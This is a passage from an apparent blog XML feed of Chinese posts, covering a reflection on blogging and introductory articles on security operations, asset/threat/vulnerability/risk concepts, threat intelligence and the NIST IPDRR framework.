的接受失败</strong>。如果你想提高智能，你需要挑战自己，这表示接受了略高过自己能力的任务，你很有可能第一次就会失败，但失败没有什么大不了的。人生中的一次又一次的失败是成功的原因。<br>学习技能不是天生的。所有的学习者都要学会自觉、时间分配、足智多谋（如遇到难题时该如何做）。</p><p>终身学习，做保持好奇心和探索欲的父母和老师，我们需要更多的智慧。而教育就是将智慧薪火相传的过程，尊重孩子的认知规律，谨慎积极的保持努力和践行。教育使人更聪明，聪明的人可以使教育更美好。</p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
            <tag> 学习考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>都2021了，我为什么还在用博客这种古老的方式在记录</title>
      <link href="/posts/7626e526/"/>
      <url>/posts/7626e526/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20210820/blog.png" alt="BLOG"></p><p>都2021了，在这个移动互联网异常发达，自媒体泛滥的时代，博客这个古老的在互联网时代记录自己的工具似乎是不合时宜要被大众所遗忘被历史所淘汰。而我却还在用博客这种古老的方式生活在移动互联网时代记录工作，学习，生活。</p><p><strong>一、为什么要记录</strong><br>正如我的博客标题，记录最好的自己。最朴实的想法就是想记录自己的所学、所见、所闻、所思、所想。记录使人进步。吴军老师的《全球科技通史》中提到，促进人类文明发展的是两条主线，一条是能源，一条是信息。文字的发明，信息的记录，让人类的文明得以延续和发展。是一代一代人通过信息的记载和积累促进科技的发展，让信息不管是从记录方式还是传播速度都得到了跨越式的发展，进入到了现在信息爆炸的时代。书中提到，为什么在近代早期西方的科学技术进步的速度要明显的快于中国，一个重要的原因就西方对于科学技术的研究及传播方式。西方的研究方式是通过不断的实验大量的记录进行定量研究，后人可以基于前人记录的信息研究成果进行研究和传播，大大加快的科学技术的进步。而那时候中国可能还是定性方式的研究，口口相传的传播方式，导致原来很多技术到现在都失传了。</p><p>对于个人来说，我想应该也是一样的，要想更快进步和发展，将自己生活、学习、工作过程中的所学、所见、所闻、所思、所想记录下来定期的回顾和思考应该会有所促进吧。而且随着时间的推移回头看看自己以前记录的东西应该也是一种乐趣。或许，有人看到我所记录的东西以此为鉴少走一点弯路。</p><p>不在乎文笔，不限于内容，仅仅只是记录，希望记录能够成就最好的自己。</p><p><strong>二、为什么是博客这种方式</strong><br>记录信息的手段很多，尤其是自媒体时代，微博、微信、头条、抖音、小红书啥的，平台很多。为什么还要用博客这种古老的方式呢？如果自是记录给自己看映象笔记、网易云笔记都是很好的，私密性太强，不够开放。微博、微信社交属性太强关注的都是些熟人。头条、抖音、小红书，功利性太强，为了收益去强迫自己去写也不是自己的初衷。想来想去还只有博客这种古老的方式比较合适，安安静静的自己想记录什么就记录什么。也不用去担心什么流量，不用去关注什么人关注了你。以前几个大的通用的博客平台都不提供服务了如新浪博客、网易博客等，而CSDN、cnblog主要是技术类的博客，想记录点乱七八糟的事情似乎也不太适合。所以只好自己来搭建博客咯。</p><p>自己搭建的博客<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a> 已经快两年了。记录的东西不是太多，说明见识不多，思考太少。</p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运维与安全运营</title>
      <link href="/posts/76373188/"/>
      <url>/posts/76373188/</url>
      
        <content type="html"><![CDATA[<p>安全运维与安全运营是安全人员经常听到的两个名词。到底什么是安全运维，什么是安全运营，两者之间有什么区别和联系呢？</p><p>我们先来看一下运维与运营的概念区别。<br><strong>运维</strong>一般来说指的是运行维护，通过一定的技术和管理手段保障平台或系统的正常运行。本质上是对平台、系统或产品所涉及的网络、服务器、服务的生命周期各个阶段的运营与维护，在成本、稳定性、效率上达成一致可接受的状态。</p><p><strong>运营</strong>从字面上理解更多的是指经营。通过对平台、系统或产品的经营达到预期的业务目标。对运营过程的计划、组织、实施和控制，是与产品生产和服务创造密切相关的各项管理工作的总称。从另一个角度来讲，运营管理也可以指为对生产和提供公司主要的产品和服务的系统进行设计、运行、评价和改进的管理工作。</p><p>总体来说<strong>运营应该是覆盖运维的，运维是支持运营的</strong>。那么安全运维和安全运营，应该也是同样的道理。</p><p>网上有人进行了概括：</p><p><strong>安全运维</strong>简单来说，就是从安全的角度对日常IT信息系统进行运行维护，传统运维工作主要是为了保障信息系统的正常运行，安全运维则是通过安全分析，检测和解决已经产生和即将产生的安全问题，从而建立从防护到监测到解决的闭环安全机制管理系统，实现运维的目的——保障企业整体IT系统运行正常。</p><p><strong>安全运营</strong>应该来说概念更广，狭义的安全运营是为以资产为核心，以安全事件管理为关键流程，依托于安全运营平台（SOC），建立一套实时的资产风险模型，进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理体系。广义安全运营是一个技术、流程和人有机结合的复杂的系统工程，通过对已有的安全产品、工具、服务产出的数据进行有效的分析，持续输出价值，解决安全风险，从而实现安全的最终目标。</p><p>个人认为<strong>运维更多的强调流程，运营更多的强调体系。</strong></p><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全管理之资产、脆弱性、威胁、风险</title>
      <link href="/posts/57a81e07/"/>
      <url>/posts/57a81e07/</url>
      
        <content type="html"><![CDATA[<p>​<br><strong>网络信息安全管理</strong>是指对网络资产采取合适的安全措施，以确保网络资产的可用性、完整性、可控制性和抗抵赖性，不致因网络设备、网络通信协议、网络服务、网络管理受到人为和自然因素的危害，而导致网络中断、信息泄露或破坏。网络信息管理对象主要包括网络设备、网络通信协议、网络操作系统、网络服务、安全网络管理等在内的所有支持网络系统运行的软、硬件总和。网络信息安全管理的目标就是通过适当的安全防范措施，保障网络的运行安全和信息安全，满足网上业务开展的安全要求。</p><p><strong>网络信息安全管理要素</strong>由网络管理对象、网络威胁、网络脆弱性、网络风险、网络保护措施组成。由于网络管理对象自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。网络安全管理实际上就是风险控制，其基本过程是通过网络管理对象的威胁和脆弱性进行分析，确定网络管理对象的价值、网络管理对象威胁发生的可能性、网络管理对象的脆弱程度，从而确定网络管理对象的风险等级，然后据此选取合适的安全保护措施，降低网络管理对象的风险。</p><p><strong>安全风险管理的三要素</strong>分别是<strong>资产</strong>、<strong>威胁</strong>和<strong>脆弱性</strong>，脆弱性的存在将会导致风险，而威胁主体利用脆弱性产生风险。网络攻击主要利用了系统的脆弱性。由于网络管理对象自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20210819/%E8%B5%84%E4%BA%A7%E8%84%86%E5%BC%B1%E6%80%A7%E5%A8%81%E8%83%81%E9%A3%8E%E9%99%A9%E5%85%B3%E7%B3%BB.png" alt="网络信息安全管理要素"></p><p>网络信息安全管理对象是企业、机构直接赋予了价值而需要保护的资产。它的存在形式包括有形的和无形的，如网络设备硬件、软件文档是有形的，而服务质量、网络带宽是无形的。</p><p>常见的网络信息安全管理对象信息安全资产分类如下：</p><table><thead><tr><th>分类</th><th>示例</th></tr></thead><tbody><tr><td>数据</td><td>保存在信息媒介上的各种数据资料，包括源代码、数据库数据、系统文档、运行管理规程、计划报告、用户手册、各类纸质的文档等</td></tr><tr><td>软件</td><td>系统软件：操作系统、数据库管理系统、语句包、开发系统<br>应用软件：办公软件、数据库软件、各类工具软件等<br>源程序：各种共享源代码、自行或合作开发的各种代码等</td></tr><tr><td>硬件</td><td>网络设备：路由器、网关、交换机等<br>计算机设备：大型机、小型机、服务器、工作站、台式计算机、便携计算机等<br>存储设备：磁带机、磁盘阵列、磁带、光盘、软盘、移动硬盘等<br>传输线路：光纤、双绞线等<br>保障设备：UPS、变电设备、空调、保险柜、文件柜、门禁、消防设施等<br>安全设备：防火墙、入侵检测系统、身份鉴别等<br>其他：打印机、复印机、扫描仪、传真机等</td></tr><tr><td>服务</td><td>信息服务：对外依赖该系统开展的各类服务<br>网络服务：各种网络设备、设施提供的网络连接服务<br>办公服务：为提高效率而开发的管理信息系统，包括各种内部配置管理、文件流转管理等服务</td></tr><tr><td>人员</td><td>掌握重要信息和核心业务的人员，如主机维护主管、网络维护主管及应用项目经理等</td></tr><tr><td>其他</td><td>企业形象、客户关系等</td></tr></tbody></table><p><strong>脆弱性</strong>：脆弱性也可称为弱点或漏洞，是资产或资产组中存在的可能被威胁利用造成损害的薄弱环节。脆弱性一旦被威胁成功利用就可能对资产造成损害。脆弱性可能存在于物理环境、组织、过程、人员、管理、配置、硬件、软件和信息等各个方面。</p><p>脆弱性是与资产紧密相连的，是其固有的属性，客观存在是绝对的，但存在脆弱性不一定就绝对造成安全事件。如果没有被相应的威胁利用，单纯的脆弱性本身不会对资产造成伤害。</p><table><tr><th>类型</th><th>识别对象</th><th>脆弱性子类</th></tr><tr ><td rowspan=6>技术脆弱性</td><td>物理环境</td><td>机房场地、机房防火、机房供配电、机房防静电、机房接地与防雷、电磁防护、通讯线路的保护、机房区域防护、机房设备管理等</td><tr><td>网络结构</td><td>网络结构设计、网络传输加密、网络设备安全漏洞、边界保护、外部访问控制策略、内部访问控制策略、网络设备安全配置等</td></tr><tr><td>服务器/系统软件</td><td>补丁安装、物理保护、用户帐号、口令策略、资源共享、事件审计、访问控制、新系统配置（初始化）、注册表加固、网络安全、系统软件安全漏洞、软件安全功能管理等</td></tr><tr><td>数据库</td><td>补丁安装、鉴别机制、口令机制、访问控制、网络和服务设置、备份恢复机制、审计机制等</td></tr><tr><td>应用系统</td><td>审计机制、审计存储、访问控制策略、数据完整性、通讯、鉴别机制、密码保护等</td></tr><tr><td>应用中间件</td><td>协议安全、交易完整性、数据完整性等</td></tr><tr><td rowspan=2>管理脆弱性</td><td>技术管理</td><td>物理和环境安全、通讯和操作管理、访问控制、系统开发与维护、业务连续性等</td></tr><tr><td>组织管理</td><td>安全策略、组织安全、信息资产分类与控制、人员安全、符合性等</td></tr></table>威胁：对资产或组织可能导致负面结果的一个事件的潜在源。威胁利用管理对象自身的脆弱性，采用一定的途径和方式，对评估对象造成损害或损失，从而形成风险。<p>威胁源分三类：自然威胁、人为威胁和环境威胁。</p><table><thead><tr><th>种类</th><th>描述</th><th>威胁子类</th></tr></thead><tbody><tr><td>软硬件故障</td><td>对业务实施或系统运行产生影响的设备硬件故障、通讯链路中断、系统本身或软件缺陷等问题</td><td>设备硬件故障、传输设备故障、存储媒体故障、 系统软件故障、应用软件故障、数据库软件故障、开发环境故障等</td></tr><tr><td>物理环境影响</td><td>对信息系统正常运行造成影响的物理环境问题和自然灾害</td><td>断电、静电、灰尘、潮湿、温度、洪灾、火灾、地震、暴风雨、潮汐、污染、空调设备故障、鼠蚁虫害、电磁干扰等</td></tr><tr><td>操作失误</td><td>应该执行而没有执行相应的操作，或无意执行了错误的操作</td><td>维护错误、操作失误、提供错误的指南或操作信息等</td></tr><tr><td>管理不到位</td><td>安全管理无法落实或不到位，从而破坏信息系统正常有序运行</td><td>管理制度和策略不完善、管理规程缺失、职责不明确、监督控管机制不健全等</td></tr><tr><td>恶意代码</td><td>故意在计算机系统上执行恶意任务的程序代码</td><td>病毒、特洛伊木马、蠕虫、陷门、间谍软件、窃听软件、携带恶意软件的垃圾邮件、流氓安全软件、即时消息垃圾邮件等</td></tr><tr><td>越权或滥用</td><td>通过采用一些措施，超越自己的权限访问了本来无权访问的资源，或者滥用自己的权限，做出破坏信息系统的行为</td><td>非授权访问网络资源、非授权访问系统资源、滥用权限非正常修改系统配置或数据、滥用权限泄露秘密信息、非授权使用存储介质等</td></tr><tr><td>网络攻击</td><td>利用工具和技术通过网络对信息系统进行攻击和入侵</td><td>网络探测和信息采集、漏洞探测、嗅探（账号、口令、权限等）、用户身份伪造和欺骗、用户或业务数据的窃取和破坏、系统运行的控制和破坏、拒绝服务攻击、僵尸网络、隐蔽式下载、名誉劫持、网络黑客的入侵等</td></tr><tr><td>物理攻击</td><td>通过物理的接触造成对软件、硬件、数据的破坏</td><td>物理接触、物理破坏、盗窃、勒索、罢工、内部员工蓄意破坏等</td></tr><tr><td>泄密</td><td>信息泄露给不应了解的他人</td><td>内部信息泄露、外部信息泄露等</td></tr><tr><td>篡改</td><td>非法修改信息，破坏信息的完整性使系统的安全性降低或信息不可用</td><td>篡改网络配置信息、篡改系统配置信息、篡改安全配置信息、篡改用户身份信息或业务数据信息等</td></tr><tr><td>抵赖</td><td>不承认收到的信息和所作的操作和交易</td><td>原发抵赖、接受抵赖、第三方抵赖等</td></tr></tbody></table><p>在这里可以看出威胁与攻击的区别和关系。攻击是威胁的一种类型，攻击是人为的蓄意的有计划采取的恶意破坏的行动。一般来说攻击比较容易检测到。</p><p><strong>网络信息安全风险</strong>是指特定的威胁利用网络管理对象所存在的脆弱性，导致网络管理对象的价值受到损害或丢失的可能性。简单的说，网络安全风险就是网络威胁发生的概率和所造成影响的乘积。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20210819/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0.png" alt="网络安全风险分析"></p><p>本文整理自《信息安全工程师教程第2版》</p><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识威胁情报</title>
      <link href="/posts/3866c7c1/"/>
      <url>/posts/3866c7c1/</url>
      
        <content type="html"><![CDATA[<h1 id="初识威胁情报"><a href="#初识威胁情报" class="headerlink" title="初识威胁情报"></a>初识威胁情报</h1><p>随着网络空间的广度和深度不断拓展，当今网络攻击的多样化、复杂化、专业化，安全对抗日趋激烈，传统的安全思维模式和安全技术已经无法有效满足政企客户安全防护的需要，新的安全理念、新的安全技术不断涌现。业界普遍认同：仅仅防御是不够的，更加需要持续地检测与响应。而要做到更有效的检测与更快速的响应，安全情报必不可少。有效的威胁情报可以提高安全产品的对恶意攻击识别能力，提高溯源效率，并及时采取应对措施，减少甚至消除攻击的危害。</p><p>本文收集了互联网上的威胁情报的相关知识信息，试图从威胁情报的定义、分类、应用三个方面对威胁情报进行初步的认识。</p><h2 id="一、什么是威胁情报"><a href="#一、什么是威胁情报" class="headerlink" title="一、什么是威胁情报"></a>一、什么是威胁情报</h2><p>安全情报包含漏洞、资产、威胁、风险、运行和事件等多维度安全知识在内的知识集合。<strong>安全情报</strong>是一个宽泛的概念，主要包括了<strong>威胁情报</strong>、<strong>漏洞情报</strong>、<strong>事件情报</strong>以及<strong>基础数据情报</strong>。</p><p>根据Gartner对威胁情报的定义，<strong>威胁情报</strong>是一种基于证据的知识，包括了情境、机制、指标、影响和操作建议。威胁情报描述了现存的、或者是即将出现针对资产的威胁或危险，并可以用于通知主体针对相关威胁或危险采取某种响应。简单来说威胁情报是可以针对相关威胁采取行动的知识，可以帮助企业和组织快速了解到敌对方对自己的威胁信息，从而帮助他们提前做好威胁防范、更快速地进行攻击检测与响应、更高效地进行事后攻击溯源。</p><p>从严格意义上来讲，威胁情报和漏洞情报是不同的两种安全情报，不应该将它们混淆。从防御者的角度来看，获取<strong>漏洞情报是为了知己</strong>，而获取<strong>威胁情报是为了知彼</strong>。</p><h2 id="二、威胁情报分类"><a href="#二、威胁情报分类" class="headerlink" title="二、威胁情报分类"></a>二、威胁情报分类</h2><p>根据使用方法不同，威胁情报可分为三类</p><p><strong>战略情报</strong><br>包括安全调查报告、趋势分析、行业状况等战略层面的情报，可供企业CISO或安全负责人制定安全规划和投资策略，将有限的资源投入到最需要的地方。</p><p><strong>技术情报</strong><br>包括各种威胁的丰富化情报，以及相关信息。通过攻击事件相关的IP和域名的详细信息，以及攻击者相关的攻击事件及样本，安全分析师可以对重要安全事件做准确的分析，包括报警确认、攻击影响范围、攻击链以及攻击目的、技战方法等，并进行相应的安全预测和防范。</p><p><strong>战术情报</strong><br>包括各种面向安全设备或系统的，易于执行的高可信度威胁IOC (Indicator of Compromise)。安全运营团队利用高质量的威胁IOC可帮忙安全系统自动检测未知威胁，及早产生预警和通知，快速响应恶意攻击，提高企业安全防护能力。</p><p>根据数据本身威胁情报可以分为<strong>HASH值</strong>、<strong>IP地址</strong>、<strong>域名</strong>、<strong>网络或主机特征</strong>、<strong>TTPs</strong>（Tactics、Techniques &amp; Procedures，工具、技术、过程）等<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20210625/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5.png" alt="威胁情报"></p><p><strong>HASH值</strong>：一般指样本、文件的HASH值，比如MD5和SHA系列。由于HASH函数的雪崩效应，文件任何微弱地改变，都会导致产生一个完全不同也不相关的哈希值。这使得在很多情况下，它变得不值得跟踪，所以它带来的防御效果也是最低的。</p><p><strong>​​IP地址</strong>：常见的指标之一，通过IP的访问控制可以抵御很多常见的攻击，但是又因为IP数量太大，任何攻击者均可以尝试更改IP地址，以绕过访问控制。</p><p><strong>​​域名</strong>：有些攻击类型或攻击手法也或者出于隐藏的目的，攻击者会通过域名连接外部服务器进行间接通信，由于域名需要购买、注册、与服务器绑定等操作使得它的成本相对IP是比较高的，对域名的把控产生的防御效果也是较好的。但是对于高级APT攻击或大规模的团伙攻击，往往会准备大量备用域名，所以它的限制作用也是有限。</p><p>​​<strong>网络或主机特征</strong>：这里指的特征可以是很多方面，比如攻击者浏览器的User-Agent、登录的用户名、访问的频率等，这些特征就是一种对攻击者的描述，这些情报数据可以很好的将攻击流量从其他的流量中提取出来，就会产生一种较好的防御效果。</p><p><strong>​​攻击工具</strong>：这里是指获取或检测到了攻击者使用的工具，这种基于工具的情报数据能够使得一批攻击失效，攻击者不得不进行免杀或重写工具，这就达到了增加攻击成本的目的。</p><p><strong>​​TTPs</strong>：Tactics、Techniques &amp; Procedures的缩写，指攻击者所使用的攻击策略、手法等，掌握了些信息就能明白攻击者所利用的具体漏洞，就能够针对性的布防，使得攻击者不得不寻找新的漏洞，所以这也是价值最高的情报数据。</p><p>从应用领域分类可以分为，<strong>机读情报（MRTI）</strong>、<strong>人读情报（PRTI）</strong>、<strong>画像情报</strong>和<strong>知识情报</strong>四类</p><p><strong>机读情报</strong>：可供机器理解和使用的情报，侧重于高频次、高准确性、强实效的应用场景。<br><strong>人读情报</strong>：信息量更大，需要更多的上下文、背景信息支持人工分析研判和应急响应。<br><strong>画像情报</strong>：针对单一的威胁、资产、漏洞、事件进行分析，形成相应的知识集，概念上类似于用户画像。<br><strong>知识情报</strong>：基于先验知识的规则模型和算法。这些模型和算法与平台之间高度匹配，可以快速导入平台，结合平台获得的各类数据、信息和情报，实现对某类特定类别的威胁、风险或特定事件的感知、分析、决策和处置。消费对象和应用场景集中于态势感知、SOC/SIEM类分析平台。</p><p>其中机读情报应用最广，基本已经被各大安全厂商在设备中集成，多以IoC或者Yara的形式存储。人读情报的格式比较宽泛，包括安全公告、漏洞预警、病毒/APT分析文章都属于这个类别。画像情报则是介于机读和人读情报中的一种，通常用结构化的标签和非结构化的备注来描述，针对单一的威胁、资产、漏洞、事件进行分析形成的知识集，也可以加入场景标注。而知识情报的提法主要是针对态势感知、SOC、SIEM类平台产品的，平台内置的先验规则如关联规则和知识图谱都属于这一类。</p><p>从情报市场来源来分可分为<strong>开源情报（OSINT）</strong>、<strong>商用情报</strong></p><p><strong>开源情报</strong>：Open Source Threat Intelligence 开源情报，免费从公开信息来源进行数据采集和分析后形成的情报。<br><strong>商用情报</strong>：Commercial Threat Intelligence 商业情报，在威胁情报领域，根据用户需求提供的付费情报。一般来说付费的准确度要稍高。</p><h2 id="三、威胁情报有什么用"><a href="#三、威胁情报有什么用" class="headerlink" title="三、威胁情报有什么用"></a>三、威胁情报有什么用</h2><p><strong>溯源分析</strong><br>威胁情报记录了外部攻击的大量信息，可以让安全分析师了解攻击方的情报，解决攻防战中信息不对称的困境。特别是在分析告警、进行溯源分析时，往往会在威胁情报系统中查询相关攻击 IP、Domain 等的具体信息，看看有没有攻击线索和方式，可以用作告警确认和进一步处理的依据。</p><p><strong>检测告警</strong><br>数字化时代的黑客的攻击也逐渐自动化、智能化，每天企业都会受到大量的外部攻击，依靠人去一个个分辨是不现实的，企业往往部署了可以对外部流量或外部日志进行自动化分辨的安全设备和系统，比如 FW 、 IDPS 、 SIEM 或大数据安全分析平台。如果将最新的威胁情报传输到这些 安全设备和系统中，就可以极大的提高这些设备系统对新型攻击的检测能力。<br>情报厂商往往将这些有价值的情报以IOC 的形式发布出来，用户可以将这些 IOC 导入到部署的安全设备系统中，从而可以快速实现对新型威胁攻击的识别、告警和处理。</p><p><strong>安全预防</strong><br>防守不是最好的策略，在如今企业每日都面对各式各样的网络攻击，单纯的被动防守已经无法阻挡黑客的攻击。如果能预知攻击并提前预防就可以减小不少攻击的损失。<br>通过漏洞情报可以在攻击到来之前获悉攻击的信息，事先做好准备，修复相关漏洞，加强安全防护，避免威胁攻击带来的危害。</p><p><strong>安全规划</strong><br>安全工作是一个系统性的工程，需要方方面面的知识和信息。为了做好安全规则，需要了解威胁攻击的总体现状和未来发展趋势，同时还要提供相关信息用以说明管理层提供相关投资。高级威胁情报信息可以帮助安全团队领导了解威胁攻击的状况以及预测，方便企业制定好相应安全规划和投资。</p><p><strong><em>实用的情报才是最好的情报</em></strong><br>情报的“ART”原则，符合“ART”原则的才是对企业有用的情报。<br><strong>Accuracy（准确性）</strong>：情报是否足够详细和可靠<br>威胁情报的作用是为安全团队提供相关信息并指导决策，如果情报不准确，不但没有产生价值，反而会对组织的安全决策会造成负面影响。<br><strong>Relevance（相关性）</strong>：情报是否可适用于你的业务或行业<br>不是所有的信息都是适用的，相关性较弱的情报会导致分析人员的繁重任务，并且会导致其他有效情报的时效性失效。<br><strong>Timeliness（时效性）</strong>：在你利用些情报前，情报是否已经失效<br>威胁情报是信息的集合，凡是信息，都具有时效性。往往情报的有效时间会很短，攻击者会为了隐藏自己的踪迹不断的更换一些特征信息，比如说IP地址、手法等等。</p><p>威胁情报要发挥价值，核心在于情报信息的共享。只有建立起一套威胁情报共享的机制，让有价值的威胁情报流动起来，才能真正加速安全防御的效率、效能，取得切实的防御效果。<br>威胁情报的生态系统包括两个方面：威胁情报的生产和威胁情报的消费。<br>威胁情报的生产就是通过对原始数据/样本的采集、交换、分析、追踪，产生和共享有价值的威胁情报信息的过程。<br>威胁情报的消费是指将企业和客户网络中的安全数据与威胁情报进行比对、验证，以及企业和客户方的安全分析师利用威胁情报进行分析的过程。<br>威胁情报的生产和消费构成了一个情报生态系统的闭环。只有生产没有消费，威胁情报的价值无法实现；而只有消费没有生产，威胁情报就成了无源之水。</p><p>对于政企客户而言，威胁情报的应用/消费是实现情报价值的关键。各类安全设备都应该能够消费威胁情报，但最关键的是安全管理平台/SOC对威胁情报的应用</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何理解企业安全能力框架(IPDRR)</title>
      <link href="/posts/6b94b28d/"/>
      <url>/posts/6b94b28d/</url>
      
        <content type="html"><![CDATA[<p>企业安全能力框架(IPDRR)是美国国家标准与技术研究所（National Institute of Standards and Technology）的网络安全框架（简称NISTCSF )。第一个版本于2014年发布，旨在为寻求加强网咯安全防御的组织提供指导。企业可以根据自身需求加强网络安全防御。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20210617/IPDRR%E6%A8%A1%E5%9E%8B.png" alt="企业网络安全系统框架"><br>企业网络安全系统框架（参考IPDRR）</p><p>随着社会数字化转型的深入，网络攻击事件日益增多、破坏力逐步增强。安全方法论也正逐步从”针对威胁的安全防御”向“面向业务的安全治理”（IPDRR）等演进。</p><p>IPDRR能力框架模型包括风险识别（Identify）、安全防御（Protect）、安全检测（Detect）、安全响应（Response）和安全恢复（Recovery）五大能力，从以防护为核心的模型，转向以检测和业务连续性管理的模型，变被动为主动，最终达成自适应的安全能力。</p><p>IPDRR模型体现了安全保障系统化的思想，管理与技术结合来有效保障系统核心业务的安全。通过持续的安全检测来实现IPDRR的闭环安全，为用户提供完善的安全能力框架和支撑体系。</p><p>具体来说IPDRR主要包含了五个部分：<br><strong>识别（Identify）</strong>：识别网络资产及风险，是指对系统、资产、数据和网络所面临的安全风险的认识及确认<br><strong>保护（Protect）</strong>：保护网络，是指制定和实施合适的安全措施，确保能够提供关键基础设施服务。<br><strong>检测（Detect）</strong>：发现攻击，在攻击产生时即时监测，同时监控业务和保护措施是否正常运行，制定和实施恰当的行动以发现网络安全事件<br><strong>响应（Respond）</strong>：响应和处理事件，指对已经发现的网络安全事件采取合适的行动。具体程序依据事件的影响程度来进行抉择，主要包括：事件调查、评估损害、收集证据、报告事件和恢复系统<br><strong>恢复（Recover）</strong>：恢复系统和修复漏洞，将系统恢复至正常状态，同时找到事件的根本原因，并进行预防和修复</p><p>可以参考大家对实体财物是怎么保护的就很容易理解了。举个例子，大家如何对自己的私有财产是怎么保护的呢？<br>第一步识别（Identify）肯定是识别出有哪些资产分别都有什么风险吧，比如家里的现金、金银珠宝、贵重电器、房产证、82年的拉菲、92年的茅台等等对于我们来说都是属于我们要保护的资产，这些都有被小偷偷走，被破坏等风险。所以我们需要采取一定的措施将这些资产给保护起来。<br>比如现金、金银珠宝、房产证等放在保险柜里，82年的拉菲、92年的茅台等搞个酒窖上好锁，家里的房子装好防护门、防盗窗等，这些就是第二步保护（Protect），对需要保护的资产做好基本的防护。做到了这些够不够呢？显然是不够的，这只是做好被动防御，我们还要做好主动防御，也就是第三步检测（Detect），这时候我们可以装一些监控设备摄像头、传感器等等，看时时刻刻监控我们所要保护的资产看有没有什么情况，还可以雇佣一批保安7*24小时巡逻实时监测。响应（Respond）也就是发现了什么风吹草动，就采取响应的措施，比如如果是有人破门而入就及时的告警，制止，报警。恢复（Recover）就是对易发生的损失进行恢复，如有人破门而入把门给搞坏了，就得把门重新修好或换一个新的级别更高更安全的门。</p><p>企业的网络安全也是一样的。首先要识别自己企业的网络安全资产如重要系统、服务器等都部署在哪里，有没有漏洞，基线配置有没有合规。然后需要做好基本的防护，比如在出入口部署防火墙、主机装EDR、Web服务器要在WAF的保护下、做好访问控制、部署IPS设备等等。有了基础的防护设备以后要做好检测响应比如部署NTA做好流量检测分析、部署SIEM或日志分析系统将这些基础防护设备的告警精心接入做好安全告警的检测分析。通过检测设备发现网络安全事件以后要采取响应的响应措施，比如发现漏洞要进行补洞加固等、发现攻击封堵IP等，可以通过SOAR安全编排与自动化响应平台对人、工具、流程进行协同提高对于安全事件的响应能力。最后是恢复，也就是对已经造成的破坏进行恢复至正常状态，对于失陷的主机进行离网、杀毒、重装、恢复等。</p><p>本文试图对市面上常见的安全产品进行分类来映射到IPDRR的五大能力<br><strong>识别（Identify）</strong>提供识别能力的产品包括资产管理平台、资产测绘平台、基线管理平台、漏洞扫描工具等。<br><strong>保护（Protect）</strong>提供保护能力的产品包括主机防御类EDR、VPN、4A、防火墙、IPS、WAF、抗DOS等<br><strong>检测（Detect）</strong> 提供威胁检测能力的产品包括IDS、NTA、蜜罐、恶意代码检测、用户异常行为检测等。<br><strong>响应（Respond）</strong>：提供响应能力的产品包括SIEM、安全审计、态势感知、SOAR等<br><strong>恢复（Recover）</strong>：提供恢复能力的产品包括NG-SOC，NG-SOC理论上应该是覆盖了IPDRR所有的能力。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20210617/IPDRR%E4%B8%8E%E4%BA%A7%E5%93%81%E6%98%A0%E5%B0%84.png" alt="IPDRR产品能力映射"></p><p>当然企业安全能力不能够仅仅的依靠工具，是人、策略、流程、工具综合能力的体现。企业可以根据自身需求参考IPDRR能力框架模型加强网络安全能力建设，哪里欠缺补哪里，通过管理与技术结合来有效保障系统核心业务的安全。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img 